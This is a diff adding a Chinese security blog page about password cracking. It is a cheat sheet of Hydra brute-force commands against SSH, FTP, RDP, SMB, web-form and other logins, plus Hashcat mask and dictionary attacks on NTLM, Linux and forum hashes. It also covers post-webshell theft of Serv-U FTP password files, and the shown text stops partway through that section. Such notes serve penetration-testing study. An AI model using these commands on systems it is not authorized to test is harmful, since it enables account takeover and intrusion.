@@ -1,0 +1,1325 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>密码破解</title>
+    <meta name="description" content="">
+
+    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
+    <link rel="stylesheet" href="/css/main.css ">
+    <link rel="canonical" href="http://localhost:4000/2016/09/21/brute-force/">
+    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">
+
+
+    <script>
+    // 百度统计代码
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+
+    <script>
+    // google analytics
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-111240288-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+
+
+
+</head>
+
+
+  <body>
+
+    <header id="top">
+    <div class="wrapper">
+        <a href="/" class="brand">Jirairya</a>
+        <small></small>
+        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
+        <nav id="headerNav">
+            <ul>
+                <li>
+                    
+                    <a href="/">
+                    
+                        <i class="fa fa-home"></i>Home
+                    </a>
+                </li>
+
+                
+                    
+                    <li>
+                        
+                        <a href="/archive/">
+                        
+                            <i class="fa fa-archive"></i>Archives
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/category/">
+                        
+                            <i class="fa fa-th-list"></i>Categories
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tag/">
+                        
+                            <i class="fa fa-tags"></i>Tags
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/collections/">
+                        
+                            <i class="fa fa-folder-open"></i>Collections
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/skills/">
+                        
+                            <i class="fa fa-bezier-curve"></i>Skills
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tools/">
+                        
+                            <i class="fa fa-toolbox"></i>Tools
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/about/">
+                        
+                            <i class="fa fa-paper-plane"></i>About
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="page clearfix" post>
+    <div class="left">
+        <h1>密码破解</h1>
+        <div class="label">
+
+            <div class="label-card">
+                <i class="fa fa-calendar"></i>2016-09-21
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+            
+
+
+<!-- <span class="point">•</span> -->
+<span class="categories">
+  <i class="fa fa-th-list"></i>
+  
+    
+        <a href="/category/#tools" title="Category: tools" rel="category">tools</a>&nbsp;
+    
+        <a href="/category/#sec" title="Category: sec" rel="category">sec</a>
+    
+  
+
+  <!-- <span class="point">•</span> -->
+</span>
+
+
+            </div>
+
+            <div class="label-card">
+            
+<!-- <span class="point">•</span> -->
+<span class="pageTag">
+  <i class="fa fa-tags"></i>
+  
+    
+        <!--a href="/tag/#readings" title="Tag: readings" rel="tag">readings</a-->
+        <a href="/tag/#readings" title="Tag: readings" rel="tag">readings</a>&nbsp;
+    
+        <!--a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a-->
+        <a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a>&nbsp;
+    
+        <!--a href="/tag/#tools" title="Tag: tools" rel="tag">tools</a-->
+        <a href="/tag/#tools" title="Tag: tools" rel="tag">tools</a>
+    
+  
+
+</span>
+
+            </div>
+
+        </div>
+        <hr>
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+        <ul id="markdown-toc">
+  <li><a href="#misc" id="markdown-toc-misc">MISC</a>    <ul>
+      <li><a href="#findmyhash" id="markdown-toc-findmyhash">findmyhash</a></li>
+      <li><a href="#hash-identifier" id="markdown-toc-hash-identifier">hash-identifier</a></li>
+    </ul>
+  </li>
+  <li><a href="#hydra" id="markdown-toc-hydra">Hydra</a>    <ul>
+      <li><a href="#hydra用法实例" id="markdown-toc-hydra用法实例">Hydra用法实例:</a></li>
+    </ul>
+  </li>
+  <li><a href="#hashcat" id="markdown-toc-hashcat">Hashcat</a>    <ul>
+      <li><a href="#掩码规则" id="markdown-toc-掩码规则">掩码规则</a></li>
+      <li><a href="#破解模式" id="markdown-toc-破解模式">破解模式</a></li>
+      <li><a href="#字典爆破" id="markdown-toc-字典爆破">字典爆破</a></li>
+    </ul>
+  </li>
+  <li><a href="#serv-u密码破解" id="markdown-toc-serv-u密码破解">Serv-U密码破解</a></li>
+  <li><a href="#access数据库破解" id="markdown-toc-access数据库破解">Access数据库破解</a></li>
+  <li><a href="#mysql数据库" id="markdown-toc-mysql数据库">MySQL数据库</a>    <ul>
+      <li><a href="#mysql加密方式" id="markdown-toc-mysql加密方式">MySQL加密方式</a></li>
+      <li><a href="#mysql数据库文件结构" id="markdown-toc-mysql数据库文件结构">MYSQL数据库文件结构</a></li>
+      <li><a href="#破解mysql密码" id="markdown-toc-破解mysql密码">破解MYSQL密码</a></li>
+    </ul>
+  </li>
+  <li><a href="#" id="markdown-toc-">#</a></li>
+</ul>
+
+<!--more-->
+
+<h2 id="misc">MISC</h2>
+
+<h3 id="findmyhash">findmyhash</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findmyhash MD5 <span class="nt">-h</span> 21232f297a57a5a743894a0e4a801fc3
+</code></pre></div></div>
+
+<p><img src="\img\bruteforce\findmyhash.png" alt="" /></p>
+
+<h3 id="hash-identifier">hash-identifier</h3>
+
+<p>查看hash类型：</p>
+
+<p><img src="\img\bruteforce\crack_accesspassword.png" alt="" /></p>
+
+<h2 id="hydra">Hydra</h2>
+
+<p>Hydra是世界上顶级的密码暴力破解工具，支持几乎所有协议的在线 密码破解，功能强大。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hydra v8.1 <span class="o">(</span>c<span class="o">)</span> 2014 by van Hauser/THC - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes.
+
+Syntax: hydra <span class="o">[[[</span><span class="nt">-l</span> LOGIN|-L FILE] <span class="o">[</span><span class="nt">-p</span> PASS|-P FILE]] | <span class="o">[</span><span class="nt">-C</span> FILE]] <span class="o">[</span><span class="nt">-e</span> nsr] <span class="o">[</span><span class="nt">-o</span> FILE] <span class="o">[</span><span class="nt">-t</span> TASKS] <span class="o">[</span><span class="nt">-M</span> FILE <span class="o">[</span><span class="nt">-T</span> TASKS]] <span class="o">[</span><span class="nt">-w</span> TIME] <span class="o">[</span><span class="nt">-W</span> TIME] <span class="o">[</span><span class="nt">-f</span><span class="o">]</span> <span class="o">[</span><span class="nt">-s</span> PORT] <span class="o">[</span><span class="nt">-x</span> MIN:MAX:CHARSET] <span class="o">[</span><span class="nt">-SuvVd46</span><span class="o">]</span> <span class="o">[</span>service://server[:PORT][/OPT]]
+ <span class="k">**</span>Options<span class="k">**</span>:
+<span class="nt">-l</span> LOGIN or <span class="nt">-L</span> FILE  指定破解用户名称，对特定用户破解  
+
+<span class="nt">-p</span> PASS  or <span class="nt">-P</span> FILE  指定密码或者指定字典破解  
+
+<span class="nt">-C</span> FILE   使用冒号分割 格式，如<span class="s2">"login:pass"</span> , 代替 <span class="nt">-L</span>/-P  
+
+<span class="nt">-M</span> FILE   指定服务器目标列表文件为每行一条, <span class="s1">':'</span> 指出端口  
+
+<span class="nt">-t</span> TASKS  同时运行的线程数 <span class="o">(</span>每台主机默认 16<span class="o">)</span>  
+
+<span class="nt">-U</span>        服务模块使用细节  
+
+<span class="nt">-h</span>        更多的命令行选项  
+
+server    目标服务器名称或者ip或者 192.168.0.0/24 <span class="o">(</span>使用此选项或者 <span class="nt">-M</span> 选项<span class="o">)</span>  
+
+service   指定服务名，支持的服务和协议  
+
+OPT       一些服务模块支持的额外的输入（-U选项用于获取模块的帮助信息
+</code></pre></div></div>
+
+<blockquote>
+  <table>
+    <tbody>
+      <tr>
+        <td>支持的服务和协议包括: asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head</td>
+        <td>get} http[s]-{get</td>
+        <td>post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram</td>
+        <td>digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> user <span class="nt">-P</span> passlist.txt ftp://192.168.0.1
+</code></pre></div></div>
+
+<h3 id="hydra用法实例">Hydra用法实例:</h3>
+
+<p><strong>破解ssh账号:</strong></p>
+
+<p>破解ssh账号有两种方式，一种 是指定账号破解，另外一种是指定用户列表破解，命令如下：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> 用户名 <span class="nt">-p</span> 密码字典 <span class="nt">-t</span> 线程 <span class="nt">-vV</span> <span class="nt">-e</span> ns ip ssh    
+
+hydra <span class="nt">-l</span> root <span class="nt">-P</span> pwd.dic <span class="nt">-t</span> 1 <span class="nt">-vV</span> <span class="nt">-e</span> ns <span class="nt">-o</span> save.log 192.168.44.139 ssh //对root账户进行破解，将结果保存在save.log中    
+</code></pre></div></div>
+
+<p>** 破解FTP账号:**</p>
+
+<p>破解指定用户名密码:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    hydra ip ftp <span class="nt">-l</span> 用户名 <span class="nt">-P</span> 密码字典 <span class="nt">-t</span> 线程（默认16）-vV        
+    hydra ip ftp <span class="nt">-l</span> 用户名 <span class="nt">-P</span> 密码字典 <span class="nt">-e</span> ns <span class="nt">-vV</span>    
+</code></pre></div></div>
+
+<p><strong>批量破解FTP账号和密码：</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    hydra <span class="nt">-L</span> list_user <span class="nt">-P</span> list_password 192.168.10.2 ftp <span class="nt">-V</span>  
+</code></pre></div></div>
+
+<p><strong>GET方式提交，破解WEB登录：</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    hydra <span class="nt">-l</span> 用户名 <span class="nt">-P</span> 密码字典 <span class="nt">-s</span> 80 ip http-post-form “/admin/login.php:username<span class="o">=</span>^USER^&amp;password<span class="o">=</span>^PASS^&amp;submit<span class="o">=</span>login:sorry password”  
+
+    hydra <span class="nt">-L</span> list_user <span class="nt">-P</span> list_password 192.168.10.4 http-post-form <span class="s2">"member.php？mod=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes&amp;inajax=1:fastloginfield=username&amp;username=^USER^&amp;password=^PASS^&amp;password=^PASS^&amp;quickforward=yes&amp;handlekey=ls:Login failed"</span> <span class="nt">-V</span>    
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>以上表示对192.168.10.4进行post提交破解，定义了登录的url，以及登录验证和错误登录标记。
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>member.php?mod<span class="o">=</span>logging&amp;action<span class="o">=</span><span class="nv">loginsubmit</span><span class="o">=</span>yes&amp;infloat<span class="o">=</span>yes&amp;lssubmit<span class="o">=</span>yes&amp;inajax<span class="o">=</span><span class="nv">1fastloginfield</span><span class="o">=</span>username&amp;username<span class="o">=</span>^USER^&amp;password<span class="o">=</span>^PASS^&amp;quickforward<span class="o">=</span>yes&amp;handlekey<span class="o">=</span>lsLogin failed    
+</code></pre></div></div>
+
+<p>对admin密码进行破解:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    hydra <span class="nt">-t</span> 3 <span class="nt">-l</span> admin <span class="nt">-P</span> pass.txt <span class="nt">-o</span> out.txt <span class="nt">-f</span> 192.168.0.11 http-post-form<span class="s2">"login.php:id=^USER^&amp;password=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;"</span>    
+</code></pre></div></div>
+
+<blockquote>
+  <p>-t表示同时线程数为3；“-l”表示用户名是“admin”，字典为pass.txt，保存为out.txt；“-f”表示破解一个密码就停止；“192.168.0.11”表示目标ip；“http-post-form”表示采用HTTP的POST方式提交表单密码破解；“”中的内容是错误猜解返回提示。</p>
+</blockquote>
+
+<p><strong>破解HTTPS：</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   hydra <span class="nt">-m</span> /index.php <span class="nt">-l</span> muts <span class="nt">-P</span> pass.txt 192.168.10.1 https  
+</code></pre></div></div>
+
+<p><strong>破解teamspeak：</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> 用户名 <span class="nt">-P</span> 密码字典 <span class="nt">-s</span>端口号 <span class="nt">-vV</span> ip teamspeak  
+</code></pre></div></div>
+
+<p><strong>破解Cisco:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-P</span> pass.txt 192.168.10.3 cisco    
+hydra <span class="nt">-m</span> cloud <span class="nt">-P</span> pass.txt 192.168.10.3 cisco-enable    
+</code></pre></div></div>
+
+<p><strong>破解SMB：</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    hydra <span class="nt">-l</span> administrator <span class="nt">-P</span> pass.txt 192.168.0.115 smb  
+</code></pre></div></div>
+
+<p><strong>破解POP3：</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l muts -P pass.txt my.pop3.mail pop3
+</code></pre></div></div>
+
+<p><strong>破解远程终端账号:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//破解管理员账号：
+hydra ip rdp -l administrator -P pass.txt -V    
+
+
+//批量破解账号:
+hydra -s 3389 192.168.22.19 rdp -L user.txt -P pwd.txt -V    
+
+	
+//破解HTTP-Proxy:
+hydra -l admin -P pass.txt http-proxy://192.168.10.8    
+
+//破解IMAP :
+hydra -L user.txt -p secret 192.168.9.2 imap PLAIN    
+hydra -C defaluts.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN  
+</code></pre></div></div>
+
+<h2 id="hashcat">Hashcat</h2>
+
+<p>oclHashcat号称是世界上最快的密码破解工具，是世界上唯一第一个基于GPGPU规则的引擎，提供免费的GPU（高达128个GPU）、多哈希、多操作系统（Linux和Windows本地二进制文件）、多平台（OpenCL和CUDA支持）、多算法机制、资源利用率低，基于字典攻击，分布式破解</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-a</span>  指定要使用的破解模式
+<span class="nt">-m</span>  指定要破解的hash类型所对应的id
+<span class="nt">-o</span>  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中
+<span class="nt">--force</span>	忽略破解过程中的警告信息,跑单条hash可能需要加上此选项
+<span class="nt">--show</span>	显示已经破解的hash及该hash所对应的明文
+<span class="nt">--increment</span>	 启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程,其实,并不建议这么用,因为破解时间可能会比较长
+<span class="nt">--increment-min</span>  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用
+<span class="nt">--increment-max</span>  密码最大长度,同上
+<span class="nt">--outfile-format</span> 指定破解结果的输出格式id,一般自己常用3
+<span class="nt">--username</span> 	 忽略hash文件中的指定的用户名,在破解win和linux系统用户密码hash可能会用到
+<span class="nt">--remove</span> 	 删除已被破解成功的hash
+<span class="nt">-r</span>		 使用自定义破解规则
+
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">-m</code>支持的hash类型：</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>#</th>
+      <th>Name</th>
+      <th>Category</th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>900</td>
+      <td>MD4</td>
+      <td>Raw</td>
+      <td>Hash</td>
+    </tr>
+    <tr>
+      <td>0</td>
+      <td>MD5</td>
+      <td>Raw Hash</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>5100</td>
+      <td>Half MD5</td>
+      <td>Raw Hash</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>100</td>
+      <td>SHA1</td>
+      <td>Raw Hash</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>1300</td>
+      <td>SHA-224</td>
+      <td>Raw</td>
+      <td>Hash</td>
+    </tr>
+    <tr>
+      <td>1400</td>
+      <td>SHA-256</td>
+      <td>Raw Hash</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>10800</td>
+      <td>SHA-384</td>
+      <td>Raw Hash</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>1700</td>
+      <td>SHA-512</td>
+      <td>Raw Hash</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>5000</td>
+      <td>SHA-3 (Keccak)</td>
+      <td>Raw Hash</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>600</td>
+      <td>BLAKE2b-512</td>
+      <td>Raw Hash</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>…</td>
+      <td>…</td>
+      <td>…</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="掩码规则">掩码规则</h3>
+
+<p>Hashcat-plus中以?l表示小写字母，?d表示数字，?u表示大写字母，?s表示所有可打印符号，?a代表所有可打印字符，它等于?l?u?d?s加在一起。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l | abcdefghijklmnopqrstuvwxyz		纯小写字母
+u | ABCDEFGHIJKLMNOPQRSTUVWXYZ		纯大写字母
+d | 0123456789			        纯数字
+h | 0123456789abcdef			常见小写字母和数字
+H | 0123456789ABCDEF			常见大写字母和数字
+s |  <span class="o">!</span><span class="s2">"#</span><span class="nv">$%</span><span class="s2">&amp;'()*+,-./:;&lt;=&gt;?@[</span><span class="se">\]</span><span class="s2">^_</span><span class="sb">`</span><span class="o">{</span>|<span class="o">}</span>~		特殊字符
+a | ?l?u?d?s			以上所有字符
+b | 0x00 - 0xff			可能是用来匹配像空格这种密码的
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?l?l?l?l?l?l?d?d?d?d  
+
+//表示6位小写字母和4位数字组成的密码
+
+de?l?d?s56pos 
+
+//表示由de加一位小写字母加一位数字加一位特殊字符后面跟上56pos组成的密码
+</code></pre></div></div>
+
+<p>自定义字符集规则：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-1</span>, <span class="nt">--custom-charset1</span>   | CS   | User-defined charset ?1   | <span class="nt">-1</span> ?l?d?u
+<span class="nt">-2</span>, <span class="nt">--custom-charset2</span>   | CS   | User-defined charset ?2   | <span class="nt">-2</span> ?l?d?s
+<span class="nt">-3</span>, <span class="nt">--custom-charset3</span>   | CS   | User-defined charset ?3   |
+<span class="nt">-4</span>, <span class="nt">--custom-charset4</span>   | CS   | User-defined charset ?4
+</code></pre></div></div>
+
+<p>自定义规则例子：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-1</span> ?l?s	?1?1?1?1?1 	
+//表示五位由特殊字符和小写字母组成的密码
+
+
+<span class="nt">-1</span> ?d?l	<span class="nt">-2</span> ?d?l?u <span class="nt">-3</span> ?l?u ?1?2?3	
+
+//表示密码的第一位可能是小写字母或者数字,第二位可能是大小写字母或者数字,第三位可能是大或小写字母
+</code></pre></div></div>
+
+<h3 id="破解模式">破解模式</h3>
+
+<ul>
+  <li><code class="highlighter-rouge">0 | Straight</code>:纯粹基于字典的爆破模式，后面可以连续跟上多个字典文件，破解的成功与否取决于字典质量</li>
+  <li><code class="highlighter-rouge">1 | Combination</code>：相对智能高效的爆破模式。已知密码种包含哪些字符串，将那些字符串写入文件，每行对应一个字符串，hashcat根据所提供的字符串尝试可能的组合进行猜解</li>
+  <li><code class="highlighter-rouge">3 | Brute-force</code>：基于掩码的爆破方式，根据给定的掩码进行破解，不会轮询破解。若想让其自动轮询，可以启用<code class="highlighter-rouge">increment</code>模式指定密码的最小和最大长度</li>
+  <li><code class="highlighter-rouge">6 | Hybrid Wordlist + Mask</code>：基于字典和掩码配合的爆破模式，将前面字典取出的一个字符串和后面掩码进行拼接，碰撞出密码明文</li>
+  <li><code class="highlighter-rouge">7 | Hybrid Mask + Wordlist</code>：</li>
+  <li>基于掩码和字典配合的爆破，将前面的掩码和后面的字典进行拼接爆破</li>
+</ul>
+
+<p><strong>纯字典爆破：</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">--force</span> <span class="nt">-a</span> 0 <span class="nt">-m</span> 0 test.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nt">-o</span> test2.txt
+</code></pre></div></div>
+
+<p><img src="\img\bruteforce\hashcat1.png" alt="" /></p>
+
+<p><strong>智能字典爆破：</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">--force</span> <span class="nt">-a</span> 1 <span class="nt">-m</span> 0 test.txt d1.txt d2.txt
+</code></pre></div></div>
+
+<p><strong>基于纯掩码爆破：</strong></p>
+
+<ul>
+  <li>爆破9位的纯字母hash：</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">--force</span> <span class="nt">-a</span> 3 <span class="nt">-m</span> 0 hash.txt ?l?l?l?l?l?l?l?l?l
+</code></pre></div></div>
+
+<ul>
+  <li>前三位小写字母，后四位数字：</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">--force</span> <span class="nt">-a</span> 3 <span class="nt">-m</span> 0 hash.txt ?l?l?l?d?d?d?d
+</code></pre></div></div>
+
+<ul>
+  <li>爆破8位纯数字的hash：</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">--force</span> <span class="nt">-a</span> 3 <span class="nt">-m</span> 0 hash.txt ?d?d?d?d?d?d?d?d?d?d
+</code></pre></div></div>
+
+<ul>
+  <li>知道部分字符，爆破剩余字符：</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">--force</span> <span class="nt">-a</span> 3 <span class="nt">-m</span> 0 hash.txt ?l?lve?l?la?l?l
+</code></pre></div></div>
+
+<ul>
+  <li>字典和掩码配合的爆破模式</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">--force</span> <span class="nt">-m</span> 0 test.txt <span class="nt">-a</span> 6 d1.txt <span class="nt">-1</span> ?l ?1?d?d?d
+</code></pre></div></div>
+
+<p><img src="\img\bruteforce\hashcat3.png" alt="" /></p>
+
+<ul>
+  <li>多个字典爆破</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">--force</span> <span class="nt">-m</span> 0 test.txt <span class="nt">-a</span> 6 d1.txt d2.txt <span class="nt">-1</span> ?l ?l?1?1?1?d?d?d
+</code></pre></div></div>
+
+<p><img src="\img\bruteforce\hashcat4.png" alt="" /></p>
+
+<ul>
+  <li>基于掩码和字典配合的爆破模式</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">--force</span> <span class="nt">-m</span> 0 test.txt <span class="nt">-1</span> ?l?d ?1?1?1?1 <span class="nt">-a</span> 7 d1.txt d2.txt
+</code></pre></div></div>
+
+<p><img src="\img\bruteforce\hashcat5.png" alt="" /></p>
+
+<ul>
+  <li>基于increment的自动变长模式:</li>
+</ul>
+
+<hr />
+
+<h3 id="字典爆破">字典爆破</h3>
+
+<p>将准备好的字典，pass.txt、需要破解的Hash值文件win32.hash复制到oclHashcat32程序所在的文件夹下，然后执行:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oclHashcat32 <span class="nt">-m</span> 1000 <span class="nt">-a</span> 0 <span class="nt">-o</span> winpass1.txt <span class="nt">--remove</span> win2.hash ptemp.txt  
+</code></pre></div></div>
+
+<blockquote>
+  <p>“-m 1000”表示破解类型为NTLM.
+“-a 0”表示字典破解。
+“-o”表示输出结果到winpass1.txt.
+“–remove win2.hash”表示将移除破解成功的Hash。
+“ptemp.txt”为密码字典。</p>
+</blockquote>
+
+<p><strong>oclHashcat破解Discuz！论坛密码算法md5(md5(salt)：</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oclHashcat32 <span class="nt">-m</span> 2611 <span class="nt">-a</span> 0 <span class="nt">-o</span> winpass.txt <span class="nt">--remove</span> dz. <span class="nb">hash </span>ptemp.txt  
+</code></pre></div></div>
+
+<p><strong>Linux的SHA-512加密方式，破解如下：</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oclHashcat32 <span class="nt">-m</span> 1800 sha512linux.txt p.txt  
+</code></pre></div></div>
+
+<p><strong>Linux的SHA-md5加密方式，破解如下:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oclHashcat32 <span class="nt">-m</span> 500 linuxmd5.txt p.txt  
+</code></pre></div></div>
+
+<blockquote>
+  <p>后添加部分refer: https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/</p>
+</blockquote>
+
+<h2 id="serv-u密码破解">Serv-U密码破解</h2>
+
+<p>Serv-U是一款流行的FTP服务器，很多Web服务器通过它提供文件上传、下载。在权限合适情况下，可通过Webshell获取服务器权限。</p>
+
+<p>Serv-U早期版本采用MD-5加密，在获取Serv-U这个文件夹下的ServUDaemon.ini文件后可以对Ftp用户密码进行破解。Serv-U安装目录一般位于C:\programfils\Serv-U\（视情况而定），在获得Webshell权限情况下，若服务器上还安装了Serv-U，找到ServU目录，将ServUDaemon.ini复制到本地留待后面进行破解。</p>
+
+<p>配置文件对大小写不敏感，行与行之间允许空行，主要分为[GLOBAL]全局变量段和[DOMAINS]域名配置段。[GLOBAL]段主要设置Serv-U的注册号以及刷新标志。[DOMAINS]，包括了在Serv-U下添加的所有域信息以及以下用户列表。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>GLOBAL]
+<span class="nv">Version</span><span class="o">=</span>5.0.0.0
+<span class="nv">RegistrationKey</span><span class="o">=</span> //产品注册码
+<span class="nv">ProcessID</span><span class="o">=</span> //注册号
+<span class="nv">ReloadSettins</span><span class="o">=</span>True //在修改ini文件后加入此项，这时候Serv-U会自动刷新配置文件并生效，此项随之消失
+<span class="o">[</span>DOMAINS]
+<span class="nv">Domain1</span><span class="o">=</span>0.0.0.0||21|Wizard Generated Domain|1|0|0
+//无须改动，新增加的域的IP地址以及说明，格式。ip为0.0.0.0时，serv-u自动适配系统所分配ip地址
+//Domain1<span class="o">=</span>ip|端口|域显示名称|是否生效|是否显示|是否删除
+//生效位置为0,则此域禁用
+//显示位置为0,此域不生效并且在控制面板不显示此项
+//当删除位置0,则ReloadSettings设置为True后，即刷新后 ，自动删除此域名以下所有内容
+<span class="o">[</span>Domain1] //无须更改，与以下添加的域对应
+<span class="nv">User1</span><span class="o">=</span>admin|1|0  //必须填，用户列表
+//User序号<span class="o">=</span>用户名|是否生效|是否删除
+<span class="o">[</span><span class="nv">USER</span><span class="o">=</span>admin|1]
+//用户配置段
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="nv">USER</span><span class="o">=</span>zt828|1] 表示用户为zt。  
+    <span class="nv">password</span><span class="o">=</span>mk7DC2A4B1A9A9E1F52A7F967FBCAA0A37表示ftp用户zt828的密码为“mk7DC2A4B1A9A9E1F52A7F967FBCAA0A37”。  
+    <span class="nv">HomeDir</span><span class="o">=</span>d:<span class="se">\w</span>wwroot<span class="se">\z</span>t828表示默认主目录为“d:<span class="se">\w</span>wwroot<span class="se">\z</span>t828”。  
